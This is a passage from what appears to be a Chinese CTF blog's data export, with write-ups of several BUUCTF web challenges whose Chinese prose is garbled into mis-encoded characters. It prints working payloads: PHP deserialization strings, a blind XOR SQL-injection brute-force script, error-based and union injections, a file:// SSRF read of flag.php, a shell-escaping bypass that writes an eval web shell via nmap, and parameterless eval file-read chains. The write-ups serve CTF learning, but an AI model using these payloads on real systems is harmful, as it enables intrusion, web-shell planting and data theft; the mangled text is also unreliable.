12.?file=data:text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY= #åé¢çš„base64å­—ç¬¦æ˜¯éœ€è¦ä¼ å…¥çš„å­—ç¬¦ä¸²çš„base64ç¼–ç  æ¥ä¸‹æ¥æ˜¯fileï¼Œç”±äºè¿™é‡Œä½¿ç”¨æ­£åˆ™æ›¿æ¢äº†flagæ‰€ä»¥å¾€ä¸‹çœ‹ï¼Œ æœ‰ä¸ªååºåˆ—åŒ–ï¼Œç»“åˆæºç : 12345678910111213&lt;?php class Flag{ //flag.php public $file; public function __tostring(){ if(isset($this-&gt;file)){ echo file_get_contents($this-&gt;file); echo &quot;&lt;br&gt;&quot;; return (&quot;U R SO CLOSE !///COME ON PLZ&quot;); } } } ?&gt; æ­¤æ—¶å°±å¾ˆæ˜äº†äº†è¿™é‡Œè¿˜æç¤ºäº†useless.phpï¼Œæ€è·¯å°±æ˜¯è¿™é‡ŒåŒ…å«äº†useless.phpåï¼Œååºåˆ—åŒ–è¿›å…¥useless.phpä¸­å°±å¯ä»¥è¾“å‡ºflagäº† 12345678910111213141516&lt;?php class Flag{ //flag.php public $file=&quot;flag.php&quot;; public function __tostring(){ if(isset($this-&gt;file)){ echo file_get_contents($this-&gt;file); echo &quot;&lt;br&gt;&quot;; return (&quot;U R SO CLOSE !///COME ON PLZ&quot;); } } }$a=new FLag();$a=serialize($a);print($a);?&gt; ä»¥ä¸Šæ˜¯ç”Ÿæˆååºåˆ—åŒ–å†…å®¹çš„ä»£ç ï¼Œä¸€å¼€å§‹ä¸€ç›´åœ¨æƒ³å¦‚ä½•åœ¨ç±»å¤–ç»™fileèµ‹å€¼ï¼Œåæ¥æŸ¥ä¸åˆ°ï¼ˆå¯èƒ½å§¿åŠ¿ä¸å¯¹ï¼‰ç„¶åphpstormæ­£å¥½æœ‰èµ‹å€¼åŠŸèƒ½ï¼Œæ‰€ä»¥å°±ç›´æ¥èµ‹å€¼äº†ï¼Œç„¶åæƒ³äº†ä¸€ä¸‹ï¼Œç›´æ¥å¯¹ç±»é‡Œé¢è¿›è¡Œèµ‹å€¼å…¶å®å°±å¯ä»¥äº†ï¼Œå¾—åˆ°ä»¥ä¸‹å†…å®¹ 1O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;} ç„¶åæ‹¼æ¥ 1?text=data:text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;} ä»¥ä¸Šä¸ºpayload hack worldçœ‹åˆ°è¿‡æ»¤äº†è¿™ä¹ˆå¤šï¼Œå…«æˆå°±æ˜¯ç›²æ³¨ï¼Œfuzzäº†ä¸€ä¸‹ï¼Œå‘ç°andè¢«è¿‡æ»¤äº†ï¼Œsubustræ²¡æœ‰è¢«è¿‡æ»¤ï¼Œselectä¹Ÿæ²¡æœ‰ï¼Œå› ä¸ºandè¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥è¿™é‡Œå°±éœ€è¦ä¸€äº›è¿ç®—è¿æ¥ç¬¦ï¼Œæ¯”å¦‚è¯´ä»¥å‰çš„-0- ä½†æ˜¯è¿™é‡Œ-å·è¢«è¿‡æ»¤äº†ï¼Œçœ‹äº†ä¸€ä¸‹ å‘ç°^å¼‚æˆ–ç¬¦æ²¡è¢«è¿‡æ»¤ï¼Œæµ‹è¯•äº†ä¸€ä¸‹å‘ç°å¯ä»¥ç›´æ¥å†™è„šæœ¬:flag{ed3c991a99f9480e8595a410ad4e6175} 123456789101112131415import requestsurl=r&quot;http://d9e1077c-0511-4ac8-b837-47a768476f3b.node3.buuoj.cn/index.php&quot;s=requests.session()payload=&quot;&quot;pay_try=&quot;0123456789qwertyuiopasdfghjklzxcvbnm-{}&quot;flag=&quot;&quot;for i in range(10,50): for j in pay_try: payload=f&quot;1^((substr((select(flag)from(flag)),{i},1))='{j}')^1&quot; data={&quot;id&quot;:payload} print(data) if &quot;Hello&quot; in s.post(url=url,data=data).text: flag+=j print(flag) break è¿™ä¸ªå¼‚æˆ–åœ¨è¿™é‡Œè¿˜æ˜¯ä¸€ä¸ªè¿ç®—ç¬¦: Hard SQLå’Œä¸Šä¸€é¢˜ä¸€æ ·ï¼Œä½†æ˜¯è¿™é‡Œæ˜¯ç”¨å¼‚æˆ–ä½œä¸ºè¿ç®—ç¬¦æ¥è¿æ¥ï¼Œç”¨æ‹¬å·ç»•è¿‡ç©ºæ ¼è¿‡æ»¤å› ä¸ºè¿™ç§æ–¹æ³•åˆ©ç”¨äº†å¼‚æˆ–ç¬¦å·ï¼Œæ‰€ä»¥ç»™å®ƒå–åä¸ºxoræ³¨å…¥ï¼š 1admin'^extractvalue(1,concat('~',(select(group_concat(table_name))from(information_schema.tables)where((table_schema)like('geek')))))# æ¥ä¸‹æ¥è¿˜æ˜¯ä¸€æ · ä¸è¿‡æ˜¯è¦ç”¨substrå»æˆªä¸€ä¸‹ï¼Œä½†æ˜¯è¿™é‡Œsubstrè¢«è¿‡æ»¤äº†ï¼Œfuzzä¸€ä¸‹ï¼Œå‘ç°rightä¹‹ç±»çš„æŒ‡ä»¤æ²¡è¢«è¿‡æ»¤: 1admin'^extractvalue(1,concat('~',(select(mid(password,30))from((H4rDsq1)))))# Fakebookæ³¨å†Œâ€”â€”ç™»å½•â€”â€”urlä¸Šå­˜åœ¨æ•°å­—å‹æ³¨å…¥: 1?no=1%20and%20extractvalue(1,concat(%27~%27,(select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27users%27)))%20--+ ä½†æ˜¯æŠ¥é”™æ³¨å…¥å•¥ä¸œè¥¿ä¹Ÿæ²¡æ³¨å…¥å‡ºæ¥ï¼Ÿæ‰€ä»¥å¯èƒ½è€ƒç‚¹ä¸åœ¨è¿™ï¼Œäºæ˜¯æ‰«æä¸€ä¸‹ç›®å½•çœ‹çœ‹:å‘ç°robots.txté‡Œé¢æœ‰ä¸ªuser.php.bak ä¸‹è½½æ‰“å¼€çœ‹çœ‹ 1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;?phpclass UserInfo{ public $name = &quot;&quot;; public $age = 0; public $blog = &quot;&quot;; public function __construct($name, $age, $blog) { $this-&gt;name = $name; $this-&gt;age = (int)$age; $this-&gt;blog = $blog; } function get($url) { $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $output = curl_exec($ch); $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE); if($httpCode == 404) { return 404; } curl_close($ch); return $output; } public function getBlogContents () { return $this-&gt;get($this-&gt;blog); } public function isValidBlog () { $blog = $this-&gt;blog; return preg_match(&quot;/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]{2,6}(\\:[0-9]+)?(\\/\\S*)?$/i&quot;, $blog); }} å®¡è®¡ä¸Šè¿°ä»£ç  å‘ç°å¯ç–‘çš„curl_exec()å‡½æ•°ï¼š åˆ©ç”¨curlè¯»å–å†™å…¥æ–‡ä»¶Linuxç³»ç»Ÿä¸­ä¸€èˆ¬éƒ½ä¼šè‡ªå¸¦curlå·¥å…·ï¼Œå…¶æ¬¡æ˜¯curlæ”¯æŒfileåè®®ï¼Œæ„å‘³ç€æˆ‘ä»¬èƒ½å¤Ÿè¯»å–æœ¬åœ°æ–‡ä»¶ã€‚ è¿™è¾¹ä½¿ç”¨çš„fileåè®®è¿›è¡Œè¯»å–è¿™é¢˜æ²¡æˆ‘æœ‰æƒ³è±¡å¾—é‚£ä¹ˆç®€å•ï¼šè¿™é‡Œä»å¤´å¼€å§‹æ‹ä¸€ä¸‹æ€è·¯é‡åšä¸€ä¸‹:å½“æˆ‘è¿›è¡ŒæŠ¥é”™æ³¨å…¥çš„æ—¶å€™å¾—åˆ°: 1no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS ä»¥ä¸Šå­—æ®µå å½“æˆ‘ä»¬è·å–dataå­—æ®µåçš„æ—¶å€™å‘ç° 1O:8:&quot;UserInfo&quot;:3:{s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;age&quot;;i:0;s:4:&quot;blog&quot;;s:9:&quot;ad1sa.asd&quot;;} ç»“åˆå‰é¢çš„curlå‡½æ•°æ¼æ´ï¼Œæˆ‘ä»¬çŸ¥é“å¦‚æœå¯ä»¥åœ¨blogä¸€æ è¾“å…¥æˆ‘ä»¬çš„file://è¯­å¥ï¼Œé‚£ä¹ˆå°±ä¼šè¢«curl_execè§£ææ‰§è¡Œå‘½ä»¤ï¼Œä½†æ˜¯è¯¥å¦‚ä½•æ³¨å…¥å‘¢ï¼Ÿå†æ¬¡å°è¯•unionè”åˆæ³¨å…¥ï¼Œä½¿ç”¨/**/è¿›è¡Œç»•è¿‡ï¼Œå‘ç°æ˜¯å¯ä»¥çš„ï¼Œorder byéªŒè¯å­—æ®µæ•°â€”â€”æ³¨å…¥ã€‚è¿™é‡Œå°±ç›´æ¥æ”¾payload: 1?no=-1 union/**/select 1,2,3,'O:8:&quot;UserInfo&quot;:3:{s:4:&quot;name&quot;;s:1:&quot;1&quot;;s:3:&quot;age&quot;;i:0;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;}' from users --+ å°ç»“è¿™é“é¢˜æ²¡æˆ‘æƒ³è±¡å¾—é‚£ä¹ˆå®¹æ˜“ï¼Œå…¶ä¸­è¿˜æœ‰ssrfæ¼æ´çš„ç›¸å…³çŸ¥è¯†ç»“åˆsqlæ³¨å…¥è¿˜æœ‰ç®€å•åºåˆ—åŒ–é—®é¢˜æ‰“ç®—å»æ•´ç†ä¸€ç¯‡ssrfçš„æ–‡ç« ã€‚","link":"/2021/03/18/buuctf3/"},{"title":"buuctf5","text":"[BUUCTF 2018]Online Tool123456789101112131415161718&lt;?phpif (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) { $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_X_FORWARDED_FOR'];}if(!isset($_GET['host'])) { highlight_file(__FILE__);} else { $host = $_GET['host']; $host = escapeshellarg($host); $host = escapeshellcmd($host); $sandbox = md5(&quot;glzjin&quot;. $_SERVER['REMOTE_ADDR']); echo 'you are in sandbox '.$sandbox; @mkdir($sandbox); chdir($sandbox); echo system(&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;.$host);} çœŸæ­£æœ‰ç”¨çš„æ˜¯ä»ä¸‹é¢getå¼€å§‹ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä¸¤ä¸ªä¸åŒå¯»å¸¸çš„å‡½æ•°: escapeshellcmdå’Œescapeshellargçœ‹çœ‹æœ‰ä»€ä¹ˆç‰¹æ€§å§: 123escapeshellcmd() å¯¹å­—ç¬¦ä¸²ä¸­å¯èƒ½ä¼šæ¬ºéª— shell å‘½ä»¤æ‰§è¡Œä»»æ„å‘½ä»¤çš„å­—ç¬¦è¿›è¡Œè½¬ä¹‰ã€‚ æ­¤å‡½æ•°ä¿è¯ç”¨æˆ·è¾“å…¥çš„æ•°æ®åœ¨ä¼ é€åˆ° exec() æˆ– system() å‡½æ•°ï¼Œæˆ–è€… æ‰§è¡Œæ“ä½œç¬¦ ä¹‹å‰è¿›è¡Œè½¬ä¹‰ã€‚åæ–œçº¿ï¼ˆ\\ï¼‰ä¼šåœ¨ä»¥ä¸‹å­—ç¬¦ä¹‹å‰æ’å…¥ï¼š &amp;#;`|*?~&lt;&gt;^()[]{}$\\, \\x0A å’Œ \\xFFã€‚ ' å’Œ &quot; ä»…åœ¨ä¸é…å¯¹å„¿çš„æ—¶å€™è¢«è½¬ä¹‰ã€‚ åœ¨ Windows å¹³å°ä¸Šï¼Œæ‰€æœ‰è¿™äº›å­—ç¬¦ä»¥åŠ % å’Œ ! å­—ç¬¦éƒ½ä¼šè¢«ç©ºæ ¼ä»£æ›¿ã€‚ 1escapeshellarg() å°†ç»™å­—ç¬¦ä¸²å¢åŠ ä¸€ä¸ªå•å¼•å·å¹¶ä¸”èƒ½å¼•ç”¨æˆ–è€…è½¬ç ä»»ä½•å·²ç»å­˜åœ¨çš„å•å¼•å·ï¼Œè¿™æ ·ä»¥ç¡®ä¿èƒ½å¤Ÿç›´æ¥å°†ä¸€ä¸ªå­—ç¬¦ä¸²ä¼ å…¥ shell å‡½æ•°ï¼Œå¹¶ä¸”è¿˜æ˜¯ç¡®ä¿å®‰å…¨çš„ã€‚å¯¹äºç”¨æˆ·è¾“å…¥çš„éƒ¨åˆ†å‚æ•°å°±åº”è¯¥ä½¿ç”¨è¿™ä¸ªå‡½æ•°ã€‚shell å‡½æ•°åŒ…å« exec(), system() æ‰§è¡Œè¿ç®—ç¬¦ ã€‚ ä¼ å…¥çš„å‚æ•°æ˜¯ï¼š172.17.0.2' -v -d a=1 ç»è¿‡escapeshellargå¤„ç†åå˜æˆäº†'172.17.0.2'\\'' -v -d a=1'ï¼Œå³å…ˆå¯¹å•å¼•å·è½¬ä¹‰ï¼Œå†ç”¨å•å¼•å·å°†å·¦å³ä¸¤éƒ¨åˆ†æ‹¬èµ·æ¥ä»è€Œèµ·åˆ°è¿æ¥çš„ä½œç”¨ã€‚ ç»è¿‡escapeshellcmdå¤„ç†åå˜æˆ'172.17.0.2'\\\\'' -v -d a=1\\'ï¼Œè¿™æ˜¯å› ä¸ºescapeshellcmdå¯¹\\ä»¥åŠæœ€åé‚£ä¸ªä¸é…å¯¹å„¿çš„å¼•å·è¿›è¡Œäº†è½¬ä¹‰ï¼šhttp://php.net/manual/zh/function.escapeshellcmd.php æœ€åæ‰§è¡Œçš„å‘½ä»¤æ˜¯curl '172.17.0.2'\\\\'' -v -d a=1\\'ï¼Œç”±äºä¸­é—´çš„\\\\è¢«è§£é‡Šä¸º\\è€Œä¸å†æ˜¯è½¬ä¹‰å­—ç¬¦ï¼Œæ‰€ä»¥åé¢çš„'æ²¡æœ‰è¢«è½¬ä¹‰ï¼Œä¸å†åé¢çš„'é…å¯¹å„¿æˆäº†ä¸€ä¸ªç©ºç™½è¿æ¥ç¬¦ã€‚æ‰€ä»¥å¯ä»¥ç®€åŒ–ä¸ºcurl 172.17.0.2\\ -v -d a=1'ï¼Œå³å‘172.17.0.2\\å‘èµ·è¯·æ±‚ï¼ŒPOST æ•°æ®ä¸ºa=1'ã€‚ å‚è€ƒ:https://paper.seebug.org/164/ æ€»çš„æ¥è¯´å°±æ˜¯ä¸¤ä¸ªè¿ç”¨ä¼šé€ æˆå•å¼•å·é€ƒé€¸ å›åˆ°æœ¬é¢˜ä¸­:è¿™é‡Œæœ€åæ‰§è¡Œäº†systemï¼Œä¸è¿‡æ˜¯nmapçš„å‘½ä»¤è¿™é‡ŒæŸ¥çœ‹ä¸€ä¸‹nmapéƒ½æœ‰ä»€ä¹ˆå¸¸ç”¨æŒ‡ä»¤å¯ä»¥åˆ©ç”¨çš„ nmapè¾“å‡ºé€‰é¡¹ä¼¼ä¹æœ‰ä¸ªä»»æ„æ–‡ä»¶å†™å…¥:Nmapå¯ä»¥æŠŠæ‰«æç»“æœä¿å­˜ä¸ºå¤–éƒ¨æ–‡ä»¶ã€‚åœ¨éœ€è¦ä½¿ç”¨å…¶ä»–å·¥å…·å¤„ç†Nmapçš„æ‰«æç»“æœæ—¶ï¼Œè¿™ä¸€ åŠŸèƒ½ååˆ†æœ‰ç”¨ã€‚å³ä½¿æ‚¨è®¾å®šç¨‹åºæŠŠæ‰«æç»“æœä¿å­˜ä¸ºæ–‡ä»¶ï¼ŒNmapè¿˜æ˜¯ä¼šåœ¨å±å¹•ä¸Šæ˜¾ç¤ºæ‰«æç»“æœã€‚ 1nmap -oG 1.php &lt;?php @eval($_POST[&quot;1&quot;]);?&gt; ç»æµ‹è¯•å¯ä»¥è¿™æ ·å†™ ç»“åˆæµ‹è¯•æµ‹è¯•ä¸€ä¸‹å¦‚ä½•æ·»åŠ å•å¼•å·å¯ä»¥é¿å…è½¬ä¹‰å¹¶ä¸”å¼•å…¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œ 1'-oG 1.php &lt;?php @eval($_POST[1]);?&gt;' è§£æä¸€ä¸‹ï¼šéœ€è¦åŠ ä¸¤ä¸ªå•å¼•å·çš„åŸå› æ˜¯ï¼Œå¦‚æœä¸åŠ å•å¼•å·ï¼Œä»£å…¥åˆ°systemä¸­çš„æ‰§è¡Œå°±ä¸º'-oG 1.php &lt;?php @eval($_POST[1]);?&gt;'æ­¤æ—¶è¿™ä¸€æ•´æ®µå†…å®¹æ˜¯è¢«å½“åšå­—ç¬¦ä¸²çš„ï¼Œæˆ‘ä»¬éœ€è¦è®©ä»–é€ƒé€¸å‡ºæ¥,æ‰€ä»¥æ­¤æ—¶å°±ç”¨åˆ°äº†ä¸Šè¿°æ¼æ´çš„ç‰¹æ€§ åˆ†æä¸€ä¸‹ æ­¤æ—¶å‰é¢ä¸¤ä¸ªå¼•å·é—­åˆ ä¸­é—´ä¸€ä¸ª\\ åé¢çš„å¼•å·å†æ¬¡é—­åˆ æœ€åå››ä¸ªå¼•å·ä¹Ÿåˆ†åˆ«é—­åˆ: å‘é€ä»¥åä¼šæœ‰æ–‡ä»¶å¤¹çš„å›æ˜¾ï¼Œè¿›å»ç”¨èšå‰‘è¿æ¥å³å¯ï¼šæˆ‘ä»èšå‰‘é‡Œé¢æŸ¥çœ‹äº†ä¸€ä¸‹æœ€ç»ˆå†…å®¹: 123# Nmap 7.70 scan initiated Tue Mar 30 13:10:07 2021 as: nmap -T5 -sT -Pn --host-timeout 2 -F -oG 1.php \\ &lt;?php @eval($_POST[1]);?&gt;\\\\# Nmap done at Tue Mar 30 13:10:09 2021 -- 0 IP addresses (0 hosts up) scanned in 2.57 seconds//å¯ä»¥å‘ç°ä¸€å¥è¯æœ¨é©¬å®Œå¥½æ— æŸ æˆ‘çœ‹åˆ«äººçš„payloadï¼Œä¸€å¥è¯æœ¨é©¬æ˜¯æ”¾åœ¨å‰é¢çš„ï¼Œä½†æ˜¯æˆ‘æµ‹è¯•æ”¾åœ¨åé¢ä¹Ÿå¯ä»¥ï¼Œå¦‚æœæ”¾åœ¨å‰é¢ è¿˜éœ€è¦æ³¨æ„æœ€åçš„â€™å’Œå‰é¢çš„phpæ˜¯æœ‰ä¸€ä¸ªç©ºæ ¼å› ä¸º1.php//æ˜¯ä¸ä¼šè¢«è®¤ä¸ºæ˜¯ä¸€ä¸ªphpæ–‡ä»¶çš„ [RoarCTF 2019]Easy Javaå‰è¨€:æœ‰å…³javaçš„é¢˜ç›®æ˜¯æ—¶å€™å­¦ä¸€ä¸‹äº†çœ‹åˆ°ç™»å½•æ¡†è®¤ä¸ºæ˜¯sqlæ³¨å…¥ï¼Œä½†æ˜¯å°è¯•äº†ä¸€ä¸‹ï¼Œå‘ç°å¥½åƒæ²¡é‚£æ„æ€ï¼Œäºæ˜¯å›æƒ³ä¸€ä¸‹å‰å‡ æ¬¡çš„javaé¢˜ç›®ï¼Œå¥½åƒéƒ½ä¼šç»™æºç ï¼Œäºæ˜¯ç‚¹äº†ä¸€ä¸‹helpï¼Œå‘ç°æœ‰æ–‡ä»¶ä¸‹è½½æ¼æ´ï¼Ÿå°è¯•äº†ä¸€ä¸‹å‘ç°å•¥ä¹Ÿä¸è¡Œï¼Œäºæ˜¯çœ‹äº†ä¸€ä¸‹wp:åŸæ¥è¿™é¢˜éœ€è¦ç”¨postæ¥å‘é€æ•°æ®ï¼Œè¿™é‡Œåˆä¸ºæˆ‘ä»¬æä¾›äº†ä¸€ç§æ€è·¯ï¼Œå½“getæ— ååº”æ—¶ï¼Œä¸å¦¨è¯•è¯•postï¼Œä¸å¤Ÿå›æƒ³äº†ä¸€ä¸‹ï¼Œä¹‹å‰å°±æœ‰é‡åˆ°è¿‡çš„æ ·å­ï¼Œæ‰€ä»¥å¸Œæœ›è‡ªå·±èƒ½è®°ä½å§æƒ³èµ·æ¥ä¹‹å‰æ•´ç†çš„å¸¸è§æºç æ³„éœ²ï¼š web-infæºç æ³„éœ²12345678910111213WEB-INFæ˜¯Javaçš„WEBåº”ç”¨çš„å®‰å…¨ç›®å½•ï¼Œå¦‚æœæƒ³åœ¨é¡µé¢ä¸­ç›´æ¥è®¿é—®å…¶ä¸­çš„æ–‡ä»¶ï¼Œå¿…é¡»é€šè¿‡web.xmlæ–‡ä»¶å¯¹è¦è®¿é—®çš„æ–‡ä»¶è¿›è¡Œç›¸åº”æ˜ å°„æ‰èƒ½è®¿é—®ã€‚WEB-INF ä¸»è¦åŒ…å«ä¸€ä¸‹æ–‡ä»¶æˆ–ç›®å½•ï¼šâ€‹```WEB-INF/web.xml : Webåº”ç”¨ç¨‹åºé…ç½®æ–‡ä»¶, æè¿°äº†servletå’Œå…¶ä»–çš„åº”ç”¨ç»„ä»¶é…ç½®åŠå‘½åè§„åˆ™.WEB-INF/database.properties : æ•°æ®åº“é…ç½®æ–‡ä»¶WEB-INF/classes/ : ä¸€èˆ¬ç”¨æ¥å­˜æ”¾Javaç±»æ–‡ä»¶(.class)WEB-INF/lib/ : ç”¨æ¥å­˜æ”¾æ‰“åŒ…å¥½çš„åº“(.jar)WEB-INF/src/ : ç”¨æ¥æ”¾æºä»£ç (.aspå’Œ.phpç­‰)â€‹```é€šè¿‡æ‰¾åˆ° web.xml æ–‡ä»¶ï¼Œæ¨æ–­ class æ–‡ä»¶çš„è·¯å¾„ï¼Œæœ€åç›´æ¥ class æ–‡ä»¶ï¼Œå†é€šè¿‡åç¼–è¯‘ class æ–‡ä»¶ï¼Œå¾—åˆ°ç½‘ç«™æºç ã€‚ æœç„¶å¯ä»¥ä¸‹è½½ç¬¬ä¸€ä¸ªç›®å½•ä¸‹çš„æ–‡ä»¶ é€šè¿‡æ‰¾åˆ° web.xml æ–‡ä»¶ï¼Œæ¨æ–­ class æ–‡ä»¶çš„è·¯å¾„ï¼Œæœ€åç›´æ¥ class æ–‡ä»¶ï¼Œå†é€šè¿‡åç¼–è¯‘ class æ–‡ä»¶ï¼Œå¾—åˆ°ç½‘ç«™æºç ã€‚æ²¡çœ‹æ‡‚è¿™ä¸ªå¦‚ä½•åˆ©ç”¨ï¼Œäºæ˜¯æŸ¥äº†ä¸€ä¸‹:å½“æ”»å‡»è€…é€šè¿‡ä¼ å…¥æ¶æ„çš„nameå‚æ•°å€¼ä¸ºWEB-INF/web.xmlæ—¶å¯ä»¥è¯»å–Webåº”ç”¨çš„é…ç½®ä¿¡æ¯,è€Œè¿™é‡Œæ­£å¥½æ”¾äº†æŒºå¤šclassæ–‡ä»¶åï¼Œè€Œè¿™äº›classæ–‡ä»¶æ­£å¥½å­˜åœ¨åœ¨WEB-INF/classes/è¿™ä¸ªå½“ä¸­ï¼Œäºæ˜¯æˆ‘ä»¬çœ‹ä¸Šé¢çš„å†…å®¹,ä¸éš¾æ„é€ : 12filename=WEB-INF/classes/com/wm/ctf/FlagController.class#è¿™è¾¹çš„.å°±æ˜¯æˆ‘ä»¬çš„/å§ ç„¶åæœ€åæˆ‘ä»¬è¦çš„FlagController javaç±»æ–‡ä»¶åŠ ä¸ªåç¼€.classå³å¯è¯»å‡º [GXYCTF2019]BabyUploadä¸Šä¼ .htaccessMIMEç»•è¿‡åœ¨æ”¹åç¼€å°±è¡Œï¼Œæˆ‘è¿˜åŠ äº†ä¸ªgif98a [GXYCTF2019]ç¦æ­¢å¥—å¨ƒgitæ–‡ä»¶æ³„éœ²ï¼Œæ‰«æå¯å¾—: 123456789101112131415161718192021222324&lt;?phpinclude &quot;flag.php&quot;;echo &quot;flagåœ¨å“ªé‡Œå‘¢ï¼Ÿ &lt;br&gt;&quot;;if(isset($_GET['exp'])){ if (!preg_match('/data:\\/\\/|filter:\\/\\/|php:\\/\\/|phar:\\/\\//i', $_GET['exp'])) { if(';' === preg_replace('/[a-z,_]+\\((?R)?\\)/', NULL, $_GET['exp'])) {//è¿™é‡Œè¯´æ˜åªå…è®¸æ— å‚æ•°çš„å†…å®¹è¾“å…¥è¿›æ¥ if (!preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])) { // echo $_GET['exp']; @eval($_GET['exp']); } else{ die(&quot;è¿˜å·®ä¸€ç‚¹å“¦ï¼&quot;); } } else{ die(&quot;å†å¥½å¥½æƒ³æƒ³ï¼&quot;); } } else{ die(&quot;è¿˜æƒ³è¯»flagï¼Œè‡­å¼Ÿå¼Ÿï¼&quot;); }}// highlight_file(__FILE__);?&gt; phpå‡½æ•°åµŒå¥—1234567scandir() åˆ—å‡º images ç›®å½•ä¸­çš„æ–‡ä»¶å’Œç›®å½•ï¼Œscandir(.)end() å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„æœ€åä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚readfile() è¾“å‡ºä¸€ä¸ªæ–‡ä»¶implode() æŠŠæ•°ç»„å…ƒç´ ç»„åˆä¸ºå­—ç¬¦ä¸²current(localeconv()) è¿”å›ä¸€ä¸ª.next() è¿”å›ç¬¬äºŒä¸ªå…ƒç´ çš„å€¼array_rand() ä»æ•°ç»„ä¸­éšæœºå–å‡ºä¸€ä¸ªæˆ–å¤šä¸ªå•å…ƒ payload: 1. .. .git flag.php index.php 1?exp=echo(implode(scandir(chr(pos(localtime(time())))))); 1?exp=echo(implode(scandir(chr(pos(localtime(time())))))); 1?exp=var_dump(file(next(array_reverse(scandir(current(localeconv())))))); è§£æ:ç¬¬ä¸€ä¸ªåˆ¤æ–­è®©æˆ‘ä»¬æ— æ³•ä½¿ç”¨ä¸ºåè®®ï¼Œç¬¬äºŒä¸ªåˆ¤æ–­è®©æˆ‘ä»¬æ— æ³•ä¼ å…¥åŠ¨æ€å˜é‡ï¼Œç¬¬ä¸‰ä¸ªåˆ¤æ–­è¿‡æ»¤ä¸€äº›ç³»ç»Ÿå‘½ä»¤ï¼Œæ‰€ä»¥æ­¤æ—¶åªèƒ½ä½¿ç”¨å‡½æ•°åµŒå¥—çš„æ–¹å¼è¿›è¡Œè§£é¢˜ï¼Œä¸€å¼€å§‹æ„é€ çš„æ—¶å€™å‚è€ƒäº†ä¸€ä¸‹å¤§ä½¬ä»¬çš„paylaodï¼Œç”¨çš„æ˜¯æ—¶é—´æˆ³çš„å‡½æ•°ï¼Œå¡åœ¨äºŒåå¤šç§’åˆšå¥½æœ‰ä¸€ä¸ªç‚¹ï¼Œå¯ä»¥è¿›è¡Œè¯»å–ï¼Œåæ¥å‘ç°ä½¿ç”¨current(localeconv())æ›´å¥½ç”¨ï¼Œæœç„¶æˆ‘å°±æ˜¯ä¸ªèœé¸Ÿï¼Œç„¶ååœ¨æƒ³è¯»å–æ–‡ä»¶çš„æ—¶å€™ï¼Œç”±äºæ˜¯åœ¨å€’æ•°ç¬¬äºŒä¸ªï¼Œæ¯”è¾ƒéš¾åŠï¼Œä¸€å¼€å§‹æƒ³çš„æ˜¯ç›´æ¥åˆ é™¤index.phpæ–‡ä»¶å°±å¯ï¼Œåæ¥æƒ³æƒ³è‡ªå·±ä¹Ÿå¤ªæš´åŠ›ï¼Œè¿™ä¸ªç¯å¢ƒçš„è¿è¡Œå°±æ˜¯ä¾æ‰˜è¿™ä¸ªæ–‡ä»¶çš„ï¼Œäºæ˜¯å°±ä½œç½¢äº†ï¼Œç„¶åå†å»æŸ¥é˜…äº†ä¸€ä¸‹èµ„æ–™ï¼Œå‘ç°äº†ä¸€ä¸ªç¿»è½¬å‡½æ•°ï¼Œè¿™æ ·å°±å¯ä»¥å®ç°flag.phpæ–‡ä»¶çš„è¯»å–äº†","link":"/2021/03/30/buuctf5/"},{"title":"bypass_disable_functions","text":"get shell æ‰“å¼€ä»¥åå‘ç°æ˜¯è¿™æ ·çš„ï¼Œæˆ‘ä»¥ä¸ºæ˜¯è¢«åŠ å¯†äº†ï¼Œç›´æ¥æŠŠä¸Šé¢çš„å†…å®¹ç²˜è´´å¤åˆ¶æœç´¢ï¼Œåæ¥å‘ç°ï¼Œæ˜¯ä½¿ç”¨äº†æ··æ·†ä»£ç çš„å·¥å…·ï¼Œæ‹¿å»è§£å¯†ä¸€ä¸‹å°±å¯ä»¥å¾—åˆ°ä»¥ä¸‹å†…å®¹ 1234&lt;?phphighlight_file(njVysBZvxrLkFYdNofcgGuawDJblpOSQEHRUmKiAhzICetPMqXWT);@eval($_POST[ymlisisisiook]);?&gt; è§£å¯†ç½‘å€å¦‚ä¸‹:https://www.zhaoyuanma.com/phpjm.htmlçœ‹èµ·æ¥æ˜¯ä¸ªä¸€å¥è¯æœ¨é©¬ï¼Œç”¨èšå‰‘è¿æ¥è¯•è¯•:æ¥ä¸‹æ¥æˆ‘æƒ³è®¿é—®ä¸€ä¸‹å…¶ä»–æ–‡ä»¶å¤¹è¯•è¯•ï¼Œå‘ç°æ˜¯æ²¡æœ‰æƒé™çš„ï¼Œè¿™ä¸ªæ—¶å€™å°±è¦æƒ³æƒ³å¦‚ä½•ææƒäº†ï¼Ÿ æ‰“å¼€å‘½ä»¤æ‰§è¡Œçª—å£ï¼Œå‘ç°ä¸è®ºè¾“å…¥ä»€ä¹ˆæŒ‡ä»¤éƒ½æ˜¯retæœç´¢ä¸€ä¸‹è¿™ä¸ªret=127ä»€ä¹ˆæ„æ€,å‘ç°æ˜¯ç»•è¿‡disable_functions æ¥ä¸‹æ¥å°±ç›´æ¥å»ç™¾åº¦å¦‚æœbypass_disable_functionsè¿™é‡Œä»‹ç»è¯´å¯ä»¥ç›´æ¥ç”¨antswordé‡Œé¢çš„æ’ä»¶ 